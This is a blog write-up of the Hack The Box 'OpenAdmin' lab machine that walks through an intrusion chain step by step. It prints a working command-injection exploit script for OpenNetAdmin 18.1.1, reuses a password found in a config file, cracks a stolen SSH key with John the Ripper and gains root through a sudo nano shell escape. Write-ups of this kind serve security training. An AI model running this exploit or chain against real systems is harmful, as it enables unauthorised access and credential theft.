---
date: 2020-05-03 02:00:54
layout: post
title: "OpenAdmin Hack The Box Walkthrough"
subtitle:
description: Today we will be doing OpenAdmin from Hack The Box. This machine was rated easy and good for beginners.
image: /assets/img/uploads/openadmin/openAdmin.jpg
optimized_image: /assets/img/uploads/openadmin/openAdmin-optimized.jpg
category: walkthrough
tags: hackthebox boot2root
author:
paginate: false
---

Today we will be doing OpenAdmin from Hack The Box. This machine was rated easy and good for beginners. This includes exploiting a vulnerable version of OpenNetAdmin, exploting some php files and then using nano for privilege escalation. 
### Enumeration and Initial Foothold

We begin our enumeration by running a port scan with Nmap, checking for open ports and default scripts.

```r
m1m3@kali:~$ nmap -sC -sV -oA nmap/openAdmin 10.10.10.171

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 22:38 IST
Nmap scan report for 10.10.10.171
Host is up (0.33s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
4444/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.29 seconds
```

We see a webserver running on port 80 showing the default apache page.

<center><br>
<img src="/assets/img/uploads/openadmin/port80.png">
</center>

Next, we will be running a gobuster scan searching for the directories.

<center><br>
<img src="/assets/img/uploads/openadmin/dirbuster.png">
</center>

We can see a directory name ona which shows is running OpenNetAdmin Version 18.1.1

<center><br>
<img src="/assets/img/uploads/openadmin/ona.png">
</center>

On looking on searchsploit, we see a vulnerable version which gives us remote command execution.

```r
m1m3@kali:~$ searchsploit OpenNetAdmin
--------------------------------------- ---------------------------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ---------------------------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                 | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)  | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                   | exploits/php/webapps/47691.sh
--------------------------------------- ---------------------------------------------------------
```

For some reason, the exploit was not working for me, so instead I used copied the exploit from exploitdb. You can copy the following exploit and save it as <i>exploit.sh</i>

```sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux
 
# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux
 
#!/bin/bash
 
URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Give the file executable permissions and run the exploit.

```r
m1m3@kali:~$ chmod +x exploit.sh 
m1m3@kali:~$ ./exploit.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)   
```

### User Shell

We managed to get a low privileged shell! Let's now go for user. Currently we are in <i>/opt/ona/www/</i>

```r
$ pwd                                   
/opt/ona/www
$ ls -lah
total 80K
drwxrwxr-x 10 www-data www-data 4.0K May  1 17:04 .
drwxr-x---  7 www-data www-data 4.0K Nov 21 18:23 ..
-rw-rw-r--  1 www-data www-data 2.0K Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4.0K Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 2.0K Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4.1K Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4.0K Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4.0K Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 2.0K Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4.0K Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4.5K Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1.1K Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4.0K Jan  3  2018 modules
-rw-r--r--  1 www-data www-data 5.4K May  1 16:40 php-reverse-shell.php
drwxrwxr-x  3 www-data www-data 4.0K Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4.0K Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4.0K Jan  3  2018 workspace_plugins
```

If we look into the contents of local/config/ we can see a config file, which gives us a password. 

```r
$ ls -lah local/config/
total 16K
drwxrwxr-x 2 www-data www-data 4.0K Nov 21 16:51 .
drwxrwxr-x 5 www-data www-data 4.0K Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1.2K Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer

$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

$ 
```

Also, If we look at the home directory, we have two users there jimmy and joanna.

```r
$ ls /home/
jimmy
joanna
```

We can use the password we got to shh into jimmy.

```r
m1m3@kali:~$ ssh jimmy@10.10.10.171

jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  1 18:32:27 UTC 2020

  System load:  1.4               Processes:             190
  Usage of /:   50.3% of 7.81GB   Users logged in:       1
  Memory usage: 34%               IP address for ens160: 10.10.10.171
  Swap usage:   0%

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May  1 18:23:38 2020 from 10.10.14.71
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:~$ cd ../joanna/
-bash: cd: ../joanna/: Permission denied
```

We cannot cd into joanna's home directory, so we need to find some other way in. After some enumeration, I found that we have a directory in /var/www/internal/ owned by user jimmy.

```r
jimmy@openadmin:/var/www/internal$ ls -lah
total 20K
drwxrwx--- 2 jimmy internal 4.0K Nov 23 17:43 .
drwxr-xr-x 4 root  root     4.0K Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3.2K Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
```
Looking into main.php, we can see that it prompts the id_rsa of user joanna.

```php
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:/var/www/internal$ 
```

Now we need to know which port this service is running on. For this we can use the `netstat -tulpn` command:

```r
jimmy@openadmin:/var/www/internal$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
jimmy@openadmin:/var/www/internal$ 
```
We can see a service running on port 52846. We can get the file using:

```r
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
```

<center><br>
<img src="/assets/img/uploads/openadmin/rsa.png">
</center>

Now we can decrypt the rsa using john and get the password <i>bloodninjas</i>

```r
m1m3@kali:~$ python /usr/share/john/ssh2john.py joanna_rsa> joanna_rsa.hash
m1m3@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2020-05-02 00:39) 0.1396g/s 2003Kp/s 2003Kc/s 2003KC/sa6_123..*7_Vamos!
Session completed
```

Now Let's ssh into user joanna, but don't forget to change permissions of the rsa key.

```r
m1m3@kali:~$ chmod 700 joanna_rsa
m1m3@kali:~$ ssh -i joanna_rsa joanna@10.10.10.171

Enter passphrase for key 'joanna_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  1 19:13:01 UTC 2020

  System load:  0.15              Processes:             188
  Usage of /:   51.0% of 7.81GB   Users logged in:       1
  Memory usage: 35%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ 
```

Now we can read the user.txt!

```r
joanna@openadmin:~$ wc -c user.txt
33 user.txt
joanna@openadmin:~$ 
```

### Root User
Gaining root is easy! `sudo -l` command shows that user Joanna can run /bin/nano /opt/priv as the root user without entering a password. When you see that users can run nano as a root user, this is the easiest way to use it.

```r
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Searching on <a href="https://gtfobins.github.io/gtfobins/nano/">GTFO Bins,</a> I found that we can exploit this by open the file with nano using:

`sudo nano /opt/priv`

Then press <i>Ctrl + R</i> and then <i>Ctrl + X</i>. After that enter the following command:

`reset; sh 1>&0 2>&0`

<center><br>
<img src="/assets/img/uploads/openadmin/root.png">
</center>

That’s it! Thanks for reading! Make sure to stay tuned for more upcoming Hack The Box writeups!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/Meugraphics">Marlon Urrutia.</a>